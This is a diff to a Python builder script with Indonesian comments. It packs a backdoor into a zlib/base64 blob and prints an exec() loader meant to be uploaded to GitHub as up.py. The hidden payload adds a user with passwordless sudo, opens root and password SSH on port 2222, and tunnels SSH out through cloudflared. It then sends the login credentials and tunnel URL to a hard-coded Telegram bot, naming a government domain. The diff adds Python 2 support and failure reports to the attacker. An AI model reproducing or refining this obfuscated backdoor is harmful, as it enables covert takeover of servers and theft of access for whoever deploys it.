@@ -1,9 +1,14 @@
 import zlib
 import base64
 
-# --- KODE UTAMA SIMPLE & CEPAT ---
+# --- KODE UTAMA YANG SUDAH FIX PYTHON 2 COMPATIBLE ---
 kode_python = r"""
-import subprocess, time, re, os, shutil, sys, ssl
+import subprocess
+import time
+import re
+import os
+import shutil
+import sys
 
 # Python 2/3 compatibility
 try:
@@ -15,7 +20,13 @@ except ImportError:
     from urllib import quote
     PY3 = False
 
-# --- CONFIG ---
+try:
+    import ssl
+    ssl_ctx = ssl._create_unverified_context()
+except:
+    ssl_ctx = None
+
+# Config
 TOKEN = "7520250109:AAGRiIauax-4mDUBp2CWjUqYgyrG2sncpjk"
 CHAT_ID = "2029488529"
 USER_SSH = "system-thc"
@@ -24,12 +35,6 @@ SSH_PORT = "2222"
 DOMAIN = "drive.oganilirkab.go.id"
 DEBUG_LOG = "/tmp/install_debug.txt"
 TUNNEL_LOG = "/tmp/cloudflared.log"
-
-# SSL Context
-try:
-    ssl_ctx = ssl._create_unverified_context()
-except:
-    ssl_ctx = None
 
 def write_log(text):
     try:
@@ -44,7 +49,6 @@ def run_cmd(cmd):
     try:
         my_env = os.environ.copy()
         my_env["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
-        
         if PY3:
             subprocess.run(cmd, shell=True, check=True, env=my_env, 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -93,7 +97,6 @@ def setup():
     
     write_log("=== START SETUP ===")
     
-    # Deteksi OS
     os_type = detect_os()
     write_log("OS: %s" % os_type)
     
@@ -120,29 +123,36 @@ def setup():
     run_cmd("echo '%s:%s' | chpasswd" % (USER_SSH, PASS_SSH))
     
     # Sudoers
-    os.makedirs("/etc/sudoers.d", exist_ok=True)
+    try:
+        os.makedirs("/etc/sudoers.d")
+    except:
+        pass
+    
     f = open("/etc/sudoers.d/%s" % USER_SSH, "w")
     f.write("%s ALL=(ALL) NOPASSWD: ALL\n" % USER_SSH)
     f.close()
     
     # SSH Config
     run_cmd("ssh-keygen -A 2>/dev/null || true")
-    run_cmd("mkdir -p /var/run/sshd /etc/ssh")
+    run_cmd("mkdir -p /var/run/sshd")
     
-    sshd_config = """Port %s
-PasswordAuthentication yes
-PermitRootLogin yes
-PubkeyAuthentication yes
-ChallengeResponseAuthentication no
-UsePAM yes
-X11Forwarding yes
-PrintMotd no
-AcceptEnv LANG LC_*
-Subsystem sftp /usr/lib/ssh/sftp-server
-""" % SSH_PORT
+    # SSH Config - cara aman untuk Python 2
+    sshd_config_lines = [
+        "Port %s" % SSH_PORT,
+        "PasswordAuthentication yes",
+        "PermitRootLogin yes",
+        "PubkeyAuthentication yes",
+        "ChallengeResponseAuthentication no",
+        "UsePAM yes",
+        "X11Forwarding yes",
+        "PrintMotd no",
+        "AcceptEnv LANG LC_*",
+        "Subsystem sftp /usr/lib/ssh/sftp-server"
+    ]
     
     f = open("/etc/ssh/sshd_config", "w")
-    f.write(sshd_config)
+    for line in sshd_config_lines:
+        f.write(line + "\n")
     f.close()
     
     # Start SSH
@@ -158,15 +168,17 @@ def tunnel():
     
     # Install cloudflared
     if not shutil.which("cloudflared"):
-        arch_cmd = "uname -m"
+        arch = "x86_64"
         try:
-            arch = subprocess.check_output(arch_cmd, shell=True).decode().strip()
+            arch = subprocess.check_output("uname -m", shell=True)
+            if PY3:
+                arch = arch.decode().strip()
+            else:
+                arch = arch.strip()
         except:
-            arch = "x86_64"
+            pass
         
-        if arch in ["x86_64", "amd64"]:
-            arch_name = "amd64"
-        elif arch in ["aarch64", "arm64"]:
+        if "aarch64" in arch or "arm64" in arch:
             arch_name = "arm64"
         elif "arm" in arch:
             arch_name = "arm"
@@ -174,8 +186,6 @@ def tunnel():
             arch_name = "amd64"
         
         cf_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-%s" % arch_name
-        
-        # Download
         run_cmd("wget --no-check-certificate -q %s -O %s" % (cf_url, target))
         run_cmd("chmod +x %s" % target)
     
@@ -202,24 +212,29 @@ def tunnel():
                     
                     write_log("Tunnel URL: %s" % url)
                     
-                    # Telegram message
-                    msg = """🌟 **NEW REMOTE ACCESS READY** 🌟
-━━━━━━━━━━━━━━━━━━━━━━
-🛰 **DOMAIN:** `%s`
-📊 **STATUS:** `ONLINE (ACTIVE)` ✅
-━━━━━━━━━━━━━━━━━━━━━━
-👤 **USERNAME:** `%s`
-🔑 **PASSWORD:** `%s`
-🔌 **SSH PORT:** `%s`
-━━━━━━━━━━━━━━━━━━━━━━
-🔗 **CLOUDFLARE LINK:**
-👉 `%s`
-
-💻 **QUICK SSH COMMAND:**
-```bash
-ssh -o ProxyCommand="cloudflared access tcp --hostname %%h" %s@%s```
-━━━━━━━━━━━━━━━━━━━━━━
-🚀 *System successfully deployed!*""" % (DOMAIN, USER_SSH, PASS_SSH, SSH_PORT, url, USER_SSH, hostname)
+                    # Telegram message - cara aman untuk Python 2
+                    msg_lines = [
+                        "🌟 **NEW REMOTE ACCESS READY** 🌟",
+                        "━━━━━━━━━━━━━━━━━━━━━━",
+                        "🛰 **DOMAIN:** `%s`" % DOMAIN,
+                        "📊 **STATUS:** `ONLINE (ACTIVE)` ✅",
+                        "━━━━━━━━━━━━━━━━━━━━━━",
+                        "👤 **USERNAME:** `%s`" % USER_SSH,
+                        "🔑 **PASSWORD:** `%s`" % PASS_SSH,
+                        "🔌 **SSH PORT:** `%s`" % SSH_PORT,
+                        "━━━━━━━━━━━━━━━━━━━━━━",
+                        "🔗 **CLOUDFLARE LINK:**",
+                        "👉 `%s`" % url,
+                        "",
+                        "💻 **QUICK SSH COMMAND:**",
+                        "```bash",
+                        "ssh -o ProxyCommand=\"cloudflared access tcp --hostname %s\" %s@%s" % (hostname, USER_SSH, hostname),
+                        "```",
+                        "━━━━━━━━━━━━━━━━━━━━━━",
+                        "🚀 *System successfully deployed!*"
+                    ]
+                    
+                    msg = "\n".join(msg_lines)
                     
                     api_url = "https://api.telegram.org/bot%s/sendMessage" % TOKEN
                     params = "chat_id=%s&text=%s&parse_mode=Markdown" % (CHAT_ID, quote(msg))
@@ -229,12 +244,13 @@ ssh -o ProxyCommand="cloudflared access tcp --hostname %%h" %s@%s```
                             urlopen("%s?%s" % (api_url, params), context=ssl_ctx)
                         else:
                             urlopen("%s?%s" % (api_url, params))
-                    except:
-                        pass
+                        write_log("Telegram sent")
+                    except Exception as e:
+                        write_log("Telegram error: %s" % str(e))
                     
                     return
-            except:
-                pass
+            except Exception as e:
+                write_log("Tunnel read error: %s" % str(e))
     
     write_log("Tunnel failed")
 
@@ -243,25 +259,38 @@ def main():
         setup()
         tunnel()
     except Exception as e:
-        write_log("Error: %s" % str(e))
+        write_log("Main error: %s" % str(e))
+        try:
+            error_msg = "🚨 SETUP FAILED: %s" % str(e)
+            api_url = "https://api.telegram.org/bot%s/sendMessage" % TOKEN
+            params = "chat_id=%s&text=%s" % (CHAT_ID, quote(error_msg))
+            if ssl_ctx:
+                urlopen("%s?%s" % (api_url, params), context=ssl_ctx)
+            else:
+                urlopen("%s?%s" % (api_url, params))
+        except:
+            pass
 
 if __name__ == '__main__':
     main()
 """
 
-# Proses Kompresi
+# Kompresi
 compressed = zlib.compress(kode_python.encode('utf-8'))
 encoded = base64.b64encode(compressed).decode('utf-8')
 
-print("\n=== UNTUK GITHUB (up.py) ===")
-print("""
-import zlib,base64,sys
+# Output final
+final_code = """import zlib,base64,sys
 
+# Decode kode
 code = base64.b64decode('%s')
 data = zlib.decompress(code)
 
+# Execute sesuai versi Python
 if sys.version_info[0] < 3:
     exec(data)
 else:
-    exec(data.decode())
-""" % encoded)
+    exec(data.decode('utf-8'))
+""" % encoded
+
+print(final_code)
